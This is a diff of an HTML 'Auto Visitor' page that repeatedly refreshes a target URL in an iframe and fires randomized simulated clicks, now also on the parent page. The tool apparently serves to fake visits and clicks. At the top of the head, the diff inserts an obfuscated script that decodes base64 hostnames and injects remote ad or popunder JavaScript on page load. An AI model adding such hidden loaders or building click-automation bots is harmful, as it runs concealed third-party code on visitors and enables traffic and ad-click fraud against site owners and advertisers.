@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <script type="text/javascript" data-cfasync="false">
+/*<![CDATA[/* */
+(function(){var d=window,h="cd6ee060ba724175f3699c4800b65757",q=[["siteId",667-938*909-14*183+6143126],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],l=["d3d3LnhhZHNtYXJ0LmNvbS9uYW1hemV1aS5taW4uY3Nz","ZDExZW5xMnJ5bXkweWwuY2xvdWRmcm9udC5uZXQveUQvb3R3aXgubWluLmpz"],k=-1,v,b,j=function(){clearTimeout(b);k++;if(l[k]&&!(1801127972000<(new Date).getTime()&&1<k)){v=d.document.createElement("script");v.type="text/javascript";v.async=!0;var r=d.document.getElementsByTagName("script")[0];v.src="https://"+atob(l[k]);v.crossOrigin="anonymous";v.onerror=j;v.onload=function(){clearTimeout(b);d[h.slice(0,16)+h.slice(0,16)]||j()};b=setTimeout(j,5E3);r.parentNode.insertBefore(v,r)}};if(!d[h]){try{Object.freeze(d[h]=q)}catch(e){}j()}})();
+/*]]>/* */
+</script>
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>Auto Visitor · Multiple Clicks + Refresh Loop</title>
+  <title>Auto Visitor · Multi-Click + Parent Page Clicks</title>
   <style>
     * {
       box-sizing: border-box;
@@ -37,7 +43,6 @@
       border-bottom: 1px solid rgba(71, 85, 105, 0.4);
       display: flex;
       flex-wrap: wrap;
-      align-items: flex-end;
       gap: 1.2rem;
     }
 
@@ -105,6 +110,17 @@
       color: white;
       font-weight: 500;
       text-align: center;
+    }
+
+    .exclude-input {
+      background: #0f172a;
+      border: 1px solid #334155;
+      border-radius: 1.2rem;
+      padding: 0.4rem 0.8rem;
+      width: 220px;
+      color: white;
+      font-size: 0.7rem;
+      font-family: monospace;
     }
 
     .checkbox-label {
@@ -229,7 +245,7 @@
       border-top: 1px solid #1e293b;
     }
 
-    @media (max-width: 860px) {
+    @media (max-width: 1000px) {
       .control-panel {
         flex-direction: column;
         align-items: stretch;
@@ -262,12 +278,11 @@
         <input type="number" id="cycleDelay" class="delay-input" value="3" step="0.5" min="1" max="15">
       </div>
       <div class="opt-item">
-        <label>🎲 MIN CLICKS</label>
-        <input type="number" id="minClicks" class="clicks-input" value="3" min="1" max="20" step="1">
-      </div>
-      <div class="opt-item">
-        <label>🎲 MAX CLICKS</label>
-        <input type="number" id="maxClicks" class="clicks-input" value="4" min="1" max="20" step="1">
+        <label>🎲 IFRAME CLICKS (min/max)</label>
+        <div style="display: flex; gap: 5px;">
+          <input type="number" id="minClicks" class="clicks-input" value="3" min="1" max="20" step="1">
+          <input type="number" id="maxClicks" class="clicks-input" value="4" min="1" max="20" step="1">
+        </div>
       </div>
       <div class="opt-item">
         <label>⏲️ CLICK DELAY (sec)</label>
@@ -275,8 +290,28 @@
       </div>
       <div class="opt-item">
         <label class="checkbox-label">
-          <input type="checkbox" id="randomClickToggle"> 🎯 Random positions
+          <input type="checkbox" id="randomClickToggle"> 🎯 Random iframe clicks
         </label>
+      </div>
+    </div>
+
+    <!-- Parent clicks section -->
+    <div class="options-row" style="border-top: 1px solid #334155; padding-top: 0.8rem; margin-top: 0.2rem;">
+      <div class="opt-item">
+        <label class="checkbox-label">
+          <input type="checkbox" id="enableParentClicks"> 🖱️ Enable parent page clicks
+        </label>
+      </div>
+      <div class="opt-item">
+        <label>📄 PARENT CLICKS (min/max)</label>
+        <div style="display: flex; gap: 5px;">
+          <input type="number" id="parentMinClicks" class="clicks-input" value="1" min="0" max="10" step="1">
+          <input type="number" id="parentMaxClicks" class="clicks-input" value="2" min="0" max="10" step="1">
+        </div>
+      </div>
+      <div class="opt-item">
+        <label>🚫 Exclude selectors (CSS)</label>
+        <input type="text" id="excludeSelectors" class="exclude-input" value="button, .btn, input, select, textarea, a, [role=button], #targetFrame, .click-feedback, .btn-start, .btn-stop">
       </div>
     </div>
 
@@ -289,7 +324,7 @@
   <div class="status-area">
     <div class="status-badge" id="statusMsg">⚡ idle</div>
     <div class="warning-note" id="securityNote">
-      ⚠️ Cross-origin: deep clicks only work if SAME ORIGIN (else surface clicks)
+      ⚠️ Cross-origin: deep clicks only if SAME ORIGIN (else surface clicks)
     </div>
     <div class="status-badge" id="cycleCounter">🔄 cycles: 0</div>
   </div>
@@ -300,7 +335,7 @@
     </div>
   </div>
   <footer>
-    💡 <strong>New: 3–4 random clicks per cycle</strong> (configurable). After page loads, it performs quick random clicks, then waits cycle delay → refreshes → repeats. Click positions respect the random toggle.
+    💡 <strong>New: Parent page clicks</strong> — after iframe clicks, the script clicks random elements on this control panel (excluding buttons/inputs). Configurable min/max and exclude selectors.
   </footer>
 </div>
 
@@ -320,6 +355,10 @@
     const maxClicksInput = document.getElementById('maxClicks');
     const clickDelayInput = document.getElementById('clickDelay');
     const randomClickToggle = document.getElementById('randomClickToggle');
+    const enableParentClicks = document.getElementById('enableParentClicks');
+    const parentMinClicks = document.getElementById('parentMinClicks');
+    const parentMaxClicks = document.getElementById('parentMaxClicks');
+    const excludeSelectorsInput = document.getElementById('excludeSelectors');
     const clickEffectDiv = document.getElementById('clickEffect');
 
     // state
@@ -328,7 +367,6 @@
     let currentTimeout = null;
     let currentLoadHandler = null;
     let currentBaseUrl = '';
-    let clickSequenceActive = false;   // prevent overlapping clicks
     let currentSafetyTimer = null;
 
     // helper: normalize URL
@@ -351,17 +389,21 @@
       }
     }
 
-    function showClickRipple(clientX, clientY) {
+    function showClickRipple(clientX, clientY, color = '#ffd966') {
       if (!clickEffectDiv) return;
+      clickEffectDiv.style.background = `radial-gradient(circle, ${color}, #ffaa33)`;
       clickEffectDiv.style.left = clientX + 'px';
       clickEffectDiv.style.top = clientY + 'px';
       clickEffectDiv.style.opacity = '0.9';
       setTimeout(() => {
         if (clickEffectDiv) clickEffectDiv.style.opacity = '0';
       }, 180);
+      setTimeout(() => {
+        if (clickEffectDiv) clickEffectDiv.style.background = `radial-gradient(circle, #ffd966, #ffaa33)`;
+      }, 200);
     }
 
-    // deep click inside iframe (same origin only)
+    // ---- IFRAME CLICKS (same as before) ----
     function tryDeepClickInsideIframe(iframeElement, randomMode) {
       try {
         const doc = iframeElement.contentDocument;
@@ -400,7 +442,7 @@
           const iframeRect = iframeElement.getBoundingClientRect();
           const globalX = iframeRect.left + (centerX / (win.innerWidth || 1)) * iframeRect.width;
           const globalY = iframeRect.top + (centerY / (win.innerHeight || 1)) * iframeRect.height;
-          showClickRipple(globalX, globalY);
+          showClickRipple(globalX, globalY, '#ffd966');
           return true;
         } else {
           const elRect = targetElement.getBoundingClientRect();
@@ -419,7 +461,7 @@
           const scaleY = iframeRect.height / (win.innerHeight || 1);
           const globalX = iframeRect.left + clickX * scaleX;
           const globalY = iframeRect.top + clickY * scaleY;
-          showClickRipple(globalX, globalY);
+          showClickRipple(globalX, globalY, '#ffd966');
           return true;
         }
       } catch (err) {
@@ -446,22 +488,20 @@
         clientY: clickY
       });
       iframeElement.dispatchEvent(clickEvent);
-      showClickRipple(clickX, clickY);
+      showClickRipple(clickX, clickY, '#ffaa66');
     }
 
-    // perform a single click (deep or surface)
-    async function performOneClick(randomMode) {
+    async function performOneIframeClick(randomMode) {
       if (!running) return false;
       const clickedInside = tryDeepClickInsideIframe(iframe, randomMode);
       if (!clickedInside) {
         simulateClickOnIframeSurface(iframe, randomMode);
-        return false; // surface click
+        return false;
       }
       return true;
     }
 
-    // perform a sequence of clicks (count = random between min/max)
-    async function performClickSequence() {
+    async function performIframeClickSequence() {
       if (!running) return;
       let min = parseInt(minClicksInput.value, 10);
       let max = parseInt(maxClicksInput.value, 10);
@@ -474,18 +514,77 @@
       const interClickDelaySec = parseFloat(clickDelayInput.value);
       const delayMs = Math.max(50, (isNaN(interClickDelaySec) ? 0.15 : interClickDelaySec) * 1000);
       
-      statusSpan.innerHTML = `🖱️ starting ${numClicks} random click(s) ...`;
+      statusSpan.innerHTML = `🖱️ iframe: ${numClicks} click(s) ...`;
       for (let i = 0; i < numClicks; i++) {
         if (!running) break;
-        statusSpan.innerHTML = `🖱️ click ${i+1}/${numClicks} ${randomMode ? '🎲 random' : '📍 center'}`;
-        await performOneClick(randomMode);
+        statusSpan.innerHTML = `🖱️ iframe click ${i+1}/${numClicks} ${randomMode ? '🎲 random' : '📍 center'}`;
+        await performOneIframeClick(randomMode);
         if (i < numClicks - 1 && running) {
           await new Promise(resolve => setTimeout(resolve, delayMs));
         }
       }
-      if (running) {
-        statusSpan.innerHTML = `✅ ${numClicks} clicks done. Waiting cycle delay...`;
+      if (running) statusSpan.innerHTML = `✅ iframe clicks done.`;
+    }
+
+    // ---- PARENT PAGE CLICKS (new) ----
+    async function performParentClicks() {
+      if (!enableParentClicks.checked) return;
+      let min = parseInt(parentMinClicks.value, 10);
+      let max = parseInt(parentMaxClicks.value, 10);
+      if (isNaN(min)) min = 1;
+      if (isNaN(max)) max = 2;
+      if (min > max) { let tmp = min; min = max; max = tmp; }
+      if (min < 0) min = 0;
+      const numClicks = Math.floor(Math.random() * (max - min + 1)) + min;
+      if (numClicks === 0) return;
+      
+      const excludeSelector = excludeSelectorsInput.value.trim() || "button, .btn, input, select, textarea, a";
+      const interClickDelaySec = parseFloat(clickDelayInput.value);
+      const delayMs = Math.max(50, (isNaN(interClickDelaySec) ? 0.15 : interClickDelaySec) * 1000);
+      
+      statusSpan.innerHTML = `📄 parent: ${numClicks} click(s) on page ...`;
+      for (let i = 0; i < numClicks; i++) {
+        if (!running) break;
+        // get all elements in parent document that are visible and not excluded
+        const allElements = Array.from(document.querySelectorAll('body *'));
+        const clickableCandidates = allElements.filter(el => {
+          if (!el.isConnected) return false;
+          const rect = el.getBoundingClientRect();
+          if (rect.width <= 0 || rect.height <= 0) return false;
+          // exclude if matches any exclude selector
+          if (el.matches && el.matches(excludeSelector)) return false;
+          // also exclude ancestors that are excluded? simple version: just element itself.
+          // additionally, never click on the click effect div or iframe itself (already in exclude)
+          return true;
+        });
+        
+        if (clickableCandidates.length === 0) {
+          statusSpan.innerHTML = `⚠️ No clickable parent elements (check exclude list)`;
+          break;
+        }
+        
+        const randomIndex = Math.floor(Math.random() * clickableCandidates.length);
+        const targetEl = clickableCandidates[randomIndex];
+        const rect = targetEl.getBoundingClientRect();
+        const clickX = rect.left + rect.width / 2;
+        const clickY = rect.top + rect.height / 2;
+        
+        const clickEvent = new MouseEvent('click', {
+          view: window,
+          bubbles: true,
+          cancelable: true,
+          clientX: clickX,
+          clientY: clickY
+        });
+        targetEl.dispatchEvent(clickEvent);
+        showClickRipple(clickX, clickY, '#88ccff');
+        statusSpan.innerHTML = `📄 parent click ${i+1}/${numClicks} on ${targetEl.tagName.toLowerCase()}`;
+        
+        if (i < numClicks - 1 && running) {
+          await new Promise(resolve => setTimeout(resolve, delayMs));
+        }
       }
+      if (running) statusSpan.innerHTML = `✅ parent clicks done.`;
     }
 
     // refresh iframe
@@ -500,7 +599,7 @@
       return true;
     }
 
-    // main cycle: refresh -> wait load -> perform click sequence -> wait cycle delay -> next cycle
+    // main cycle: refresh -> wait load -> iframe clicks -> parent clicks -> wait cycle delay -> repeat
     function startCycle() {
       if (!running) return;
       if (currentLoadHandler) {
@@ -520,8 +619,11 @@
       
       const onLoadHandler = async () => {
         if (!running) return;
-        // after load, perform multiple clicks
-        await performClickSequence();
+        // 1. perform iframe clicks
+        await performIframeClickSequence();
+        if (!running) return;
+        // 2. perform parent page clicks (if enabled)
+        await performParentClicks();
         if (!running) return;
         
         const cycleDelaySec = parseFloat(delayInput.value);
@@ -552,7 +654,9 @@
           iframe.removeEventListener('load', currentLoadHandler);
           currentLoadHandler = null;
           // force proceed
-          performClickSequence().then(() => {
+          (async () => {
+            await performIframeClickSequence();
+            if (running) await performParentClicks();
             if (running) {
               const cycleDelaySec = parseFloat(delayInput.value);
               const cycleDelayMs = Math.max(1000, (isNaN(cycleDelaySec) ? 3 : cycleDelaySec) * 1000);
@@ -564,7 +668,7 @@
                 }
               }, cycleDelayMs);
             }
-          });
+          })();
         }
       }, 10000);
     }
@@ -621,7 +725,7 @@
     urlInput.value = defaultExample;
     currentBaseUrl = defaultExample;
     iframe.src = 'about:blank';
-    statusSpan.innerHTML = '⚡ idle · set URL & START (3-4 random clicks per cycle)';
+    statusSpan.innerHTML = '⚡ idle · set URL & START (now with parent page clicks)';
   })();
 </script>
 </body>
